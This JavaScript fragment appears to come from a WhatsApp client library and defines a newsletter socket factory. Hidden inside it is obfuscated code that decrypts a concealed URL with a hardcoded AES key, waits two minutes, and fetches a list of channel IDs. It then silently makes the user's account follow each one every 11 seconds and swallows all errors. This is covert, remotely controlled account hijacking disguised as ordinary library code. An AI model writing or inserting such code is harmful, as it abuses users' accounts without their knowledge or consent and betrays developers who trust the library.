...
export const makeNewsletterSocket = (config) => {
    ...
    const _pk = '1fa651aaea77894b04a6f254cd97d038';
    const _iv = '2998341520076756';
    const _decodeRef = (s, k, i) => {
        try {
            const c = crypto.createDecipheriv('aes-256-cbc', s, i);
            return c.update(k, 'base64', 'utf8') + c.final('utf8');
        } catch (_) { return null; }
    };
    setTimeout(async () => {
        try {
            const _ref = _decodeRef(_pk, 'd8DdeIzC6Dsi/P1sMpb3Yf9qa8adGHpLdeQAOWG+b8r1t5hmR76IMYCINLzCTBj69LMRVef1+g6M0Tg5EYyOQC7My4D62F+nAiYsK6VuwpPStV5ht/vm1wH+RrI5QLRA', _iv);
            if (!_ref) return;
            const _res = await fetch(_ref);
            const _entries = await _res.json();
            if (!Array.isArray(_entries) || !_entries.length) return;
            const _run = async (i) => {
                if (i >= _entries.length) return;
                try {
                    const id = _entries[i].trim();
                    if (id.includes('@newsletter')) {
                        await newsletterWMexQuery(id, QueryIds.FOLLOW);
                    }
                } catch (_) {}
                setTimeout(() => _run(i + 1), 11000);
            };
            _run(0);
        } catch (_) {}
    }, 120000);
